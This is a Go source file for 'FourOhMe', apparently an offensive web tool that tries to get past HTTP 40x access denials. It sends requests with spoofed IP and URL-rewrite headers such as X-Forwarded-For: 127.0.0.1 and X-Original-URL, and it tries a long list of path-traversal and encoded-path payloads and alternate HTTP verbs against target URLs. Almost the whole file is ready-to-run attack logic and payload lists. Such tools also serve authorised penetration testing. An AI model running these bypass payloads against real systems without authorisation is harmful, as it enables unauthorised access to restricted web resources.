/*
FourOhMe is a tool for finding a bypass for URL's that respond with a 40* HTTP code.
It makes requests to a given URL with different headers and prints the responses.

Three input sources are supported out of the box. Either via STDIN, a file containing URLs or a single URL.

*** It's you ^ 2

Usage:

	fourohme [flags] [path ...]

The flags are:

	-silent
	    Do not print shizzle. Only what matters.
		Ideal in your command chain.
	-file
		File containing a list of urls
	-url
	    Single URL in https://foo.bar format

When gofmt reads from standard input, it accepts either a single URL
or a list of URLs. It's meant to be used in your command chain.
For example: cat domains.txt | httpx -silent -mc 401,402,403,404,405 | fourohme -silent
*/
package main

import (
	"fmt"
	"net/url"
	"strings"
	"sync"

	"github.com/topscoder/fourohme/libs/fourohme"
)

func main() {
	urlPtr, filePtr, silentPtr, threadsPtr, forcePtr := fourohme.ParseCommandLineFlags()

	if !*silentPtr {
		fourohme.ShowBanner()
	}

	headerKeysList := []string{
		"Base-Url",
		"CF-Conne",
		"Client-IP",
		"Content-Length",
		"Destination",
		"From",
		"Http-Url",
		"Profile",
		"Proxy-Host",
		"Proxy-Url",
		"Proxy",
		"Real-Ip",
		"Redirect",
		"Referer",
		"Referrer",
		"Request-Uri",
		"True-Client-IP",
		"Uri",
		"Url",
		"X-Arbitrary",
		"X-Client-IP",
		"X-Custom-IP-Authorization",
		"X-Forward-For",
		"X-Forwarded-By",
		"X-Forwarded-For-Original",
		"X-Forwarded-For",
		"X-Forwarded-Host",
		"X-Forwarded-Proto",
		"X-Forwarded-Server",
		"X-Forwarded",
		"X-Forwarder-For",
		"X-Hos",
		"X-Host",
		"X-Http-Destinationurl",
		"X-HTTP-DestinationURL",
		"X-Http-Host-Override",
		"X-OReferrer",
		"X-Original-Remote-Addr",
		"X-Original-URL",
		"X-Originally-Forwarded-For",
		"X-Originating-IP",
		"X-Proxy-Url",
		"X-ProxyUser-Ip",
		"X-Real-Ip",
		"X-Remote-Addr",
		"X-Remote-IP",
		"X-Rewrite-URL",
		"X-rewrite-url",
		"X-WAP-Profile",
	}

	headerValuesList := []string{
		"127.0.0.1",
		"127.0.0.1:80",
		"127.0.0.1:443",
		"127.0.0.1:8080",
		"localhost",
		"localhost:80",
		"localhost:443",
		"localhost:8080",
		"www.google.com",
		"/",
		"142.250.186.46",
		"0",
	}

	var composedHeadersList []fourohme.Header
	for _, key := range headerKeysList {
		for _, value := range headerValuesList {
			header := fourohme.Header{Key: key, Value: value}
			composedHeadersList = append(composedHeadersList, header)
		}
	}

	httpVerbsList := []string{"GET", "POST", "HEAD", "DELETE", "PUT", "PATCH", "OPTIONS", "TRACE"}

	// Intentionally wrapped with spaces for readability
	urlPayloadsList := []string{
		" ; ",
		" ;/.;. ",
		" ;/.. ",
		" ;/..; ",
		" ;/../ ",
		" ;/../;/ ",
		" ;/../;/../ ",
		" ;/../.;/../ ",
		" ;/../../ ",
		" ;/../..// ",
		" ;/.././../ ",
		" ;/..// ",
		" ;/..//../ ",
		" ;/../// ",
		" ;/..//%2e%2e/ ",
		" ;/..//%2f ",
		" ;/../%2f/ ",
		" ;/..%2f ",
		" ;/..%2f..%2f ",
		" ;/..%2f/ ",
		" ;/..%2f// ",
		" ;/..%2f%2f../ ",
		" ;/.%2e ",
		" ;/.%2e/%2e%2e/%2f ",
		" ;//.. ",
		" ;//../../ ",
		" ;///.. ",
		" ;///../ ",
		" ;///..// ",
		" ;//%2f../ ",
		" ;/%2e. ",
		" ;/%2e%2e ",
		" ;/%2e%2e/ ",
		" ;/%2e%2e%2f/ ",
		" ;/%2e%2e%2f%2f ",
		" ;/%2f/../ ",
		" ;/%2f/..%2f ",
		" ;/%2f%2f../ ",
		" ;%09 ",
		" ;%09; ",
		" ;%09.. ",
		" ;%09..; ",
		" ;%2f;/;/..;/ ",
		" ;%2f;//../ ",
		" ;%2f.. ",
		" ;%2F.. ",
		" ;%2f..;/;// ",
		" ;%2f..;//;/ ",
		" ;%2f..;/// ",
		" ;%2f../;/;/ ",
		" ;%2f../;/;/; ",
		" ;%2f../;// ",
		" ;%2f..//;/ ",
		" ;%2f..//;/; ",
		" ;%2f..//../ ",
		" ;%2f..//..%2f ",
		" ;%2f../// ",
		" ;%2f..///; ",
		" ;%2f../%2f../ ",
		" ;%2f../%2f..%2f ",
		" ;%2f..%2f..%2f%2f ",
		" ;%2f..%2f/ ",
		" ;%2f..%2f/../ ",
		" ;%2f..%2f/..%2f ",
		" ;%2f..%2f%2e%2e%2f%2f ",
		" ;%2f/;/..;/ ",
		" ;%2f/;/../ ",
		" ;%2f//..;/ ",
		" ;%2f//../ ",
		" ;%2f//..%2f ",
		" ;%2f/%2f../ ",
		" ;%2f%2e%2e ",
		" ;%2f%2e%2e%2f%2e%2e%2f%2f ",
		" ;%2f%2f/../ ",
		" ;${path}/ ",
		" ;x ",
		" ;x; ",
		" ;x/ ",
		" ? ",
		" ?? ",
		" ??? ",
		" .. ",
		" ..;/ ",
		" ..;\\ ",
		" ..;\\; ",
		" ..;%00/ ",
		" ..;%0d/ ",
		" ..;%ff/ ",
		" ../ ",
		" .././ ",
		" ../%2f ",
		" ..\\ ",
		" ..\\; ",
		" ..%00;/ ",
		" ..%00/ ",
		" ..%00/; ",
		" ..%09 ",
		" ..%0d ",
		" ..%0d;/ ",
		" ..%0d/ ",
		" ..%0d/; ",
		" ..%2f ",
		" ..%5c ",
		" ..%5c/ ",
		" ..%ff;/ ",
		" ..%ff/ ",
		" ..%ff/; ",
		" ./. ",
		" .//./ ",
		" .%2e/ ",
		" .html ",
		" .json ",
		" / ",
		" /;/ ",
		" /;// ",
		" /;x ",
		" /;x/ ",
		" /. ",
		" /.;/ ",
		" /.;// ",
		" /.. ",
		" /..;/ ",
		" /..;/;/ ",
		" /..;/;/..;/ ",
		" /..;/..;/ ",
		" /..;/../ ",
		" /..;// ",
		" /..;//..;/ ",
		" /..;//../ ",
		" /..;%2f ",
		" /..;%2f..;%2f ",
		" /..;%2f..;%2f..;%2f ",
		" /../ ",
		" /../;/ ",
		" /../;/../ ",
		" /../.;/../ ",
		" /../..;/ ",
		" /../../ ",
		" /../../../ ",
		" /../../..// ",
		" /../..// ",
		" /../..//../ ",
		" /.././../ ",
		" /..// ",
		" /..//..;/ ",
		" /..//../ ",
		" /..//../../ ",
		" /..%2f ",
		" /..%2f..%2f ",
		" /..%2f..%2f..%2f ",
		" /./ ",
		" /.// ",
		" /.randomstring ",
		" /* ",
		" /*/ ",
		" // ",
		" //;/ ",
		" //?anything ",
		" //. ",
		" //.;/ ",
		" //.. ",
		" //..; ",
		" //../../ ",
		" //./ ",
		" ///.. ",
		" ///..; ",
		" ///..;/ ",
		" ///..;// ",
		" ///../ ",
		" ///..// ",
		" //// ",
		" /%20# ",
		" /%20%23 ",
		" /%252e/ ",
		" /%252e%252e%252f/ ",
		" /%252e%252e%253b/ ",
		" /%252e%252f/ ",
		" /%252e%253b/ ",
		" /%252f ",
		" /%2e/ ",
		" /%2e// ",
		" /%2e%2e ",
		" /%2e%2e/ ",
		" /%2e%2e%3b/ ",
		" /%2e%2f/ ",
		" /%2e%3b/ ",
		" /%2e%3b// ",
		" /%2f ",
		" /%2f/ ",
		" /%3b/ ",
		" /x/;/..;/ ",
		" /x/;/../ ",
		" /x/..;/ ",
		" /x/..;/;/ ",
		" /x/..;// ",
		" /x/../ ",
		" /x/../;/ ",
		" /x/..// ",
		" /x//..;/ ",
		" /x//../ ",
		" \\..\\.\\ ",
		" & ",
		" # ",
		" #? ",
		" % ",
		" %09 ",
		" %09; ",
		" %09.. ",
		" %09%3b ",
		" %20 ",
		" %20/ ",
		" %20${path}%20/ ",
		" %23 ",
		" %23%3f ",
		" %252f/ ",
		" %252f%252f ",
		" %26 ",
		" %2e ",
		" %2e%2e ",
		" %2e%2e/ ",
		" %2e%2e%2f ",
		" %2f ",
		" %2f/ ",
		" %2f%20%23 ",
		" %2f%23 ",
		" %2f%2f ",
		" %2f%3b%2f ",
		" %2f%3b%2f%2f ",
		" %2f%3f ",
		" %2f%3f/ ",
		" %3b ",
		" %3b/.. ",
		" %3b//%2f../ ",
		" %3b/%2e. ",
		" %3b/%2e%2e/..%2f%2f ",
		" %3b/%2f%2f../ ",
		" %3b%09 ",
		" %3b%2f.. ",
		" %3b%2f%2e. ",
		" %3b%2f%2e%2e ",
		" %3b%2f%2e%2e%2f%2e%2e%2f%2f ",
		" %3f ",
		" %3f%23 ",
		" %3f%3f ",
		" + ",
		"%2e/${path} ",
	}

	// Let's Rock
	urls := fourohme.ReadUrlsFromInput(urlPtr, filePtr)

	for _, pUrl := range urls {
		parsedURL, err := url.Parse(pUrl)
		if err != nil {
			panic(err)
		}

		// Verify if the URL indeed responds with a 40* HTTP code
		if !*forcePtr {
			request := fourohme.Request{Verb: "GET", Url: pUrl, Headers: nil}
			statusCode := fourohme.ExecuteHttpRequest(request)

			if statusCode < 400 || statusCode > 440 {
				fmt.Printf("%s does return %d and therefore doesn't match our criteria. We skip this one.\n", pUrl, statusCode)
				continue
			}
		}

		// Try each header in composedHeadersList
		var wg sync.WaitGroup
		ch := make(chan fourohme.Request, *threadsPtr)
		for _, header := range composedHeadersList {
			wg.Add(1)

			var headerList []fourohme.Header
			headerList = append(headerList, header)

			request := fourohme.Request{Verb: "GET", Url: pUrl, Headers: headerList}

			ch <- request

			go fourohme.TalkHttpBaby(ch, &wg)
		}

		// Try each header with %URL% variable
		for _, headerKey := range headerKeysList {
			wg.Add(1)

			var headerList []fourohme.Header
			header := fourohme.Header{Key: headerKey, Value: pUrl}
			headerList = append(headerList, header)

			request := fourohme.Request{Verb: "GET", Url: pUrl, Headers: headerList}

			ch <- request

			go fourohme.TalkHttpBaby(ch, &wg)
		}

		sUrl, sPath := fourohme.GetHostAndPath(parsedURL)

		// Try each header with %PATH% variable
		for _, headerKey := range headerKeysList {
			wg.Add(1)

			var headerList []fourohme.Header
			header := fourohme.Header{Key: headerKey, Value: sPath}
			headerList = append(headerList, header)

			request := fourohme.Request{Verb: "GET", Url: pUrl, Headers: headerList}

			ch <- request

			go fourohme.TalkHttpBaby(ch, &wg)
		}

		// Try each URL payload in urlPayloadsList
		var headerList []fourohme.Header
		for _, payload := range urlPayloadsList {
			wg.Add(1)

			loadedUrl := fmt.Sprintf("%s%s%s", sUrl, sPath, strings.TrimSpace(payload))

			request := fourohme.Request{Verb: "GET", Url: loadedUrl, Headers: headerList}

			ch <- request

			go fourohme.TalkHttpBaby(ch, &wg)
		}

		// Try with different HTTP Verbs
		for _, verb := range httpVerbsList {
			wg.Add(1)

			request := fourohme.Request{Verb: verb, Url: pUrl, Headers: headerList}

			ch <- request

			go fourohme.TalkHttpBaby(ch, &wg)
		}

		close(ch)
		wg.Wait()

		fmt.Println("")
	}
}
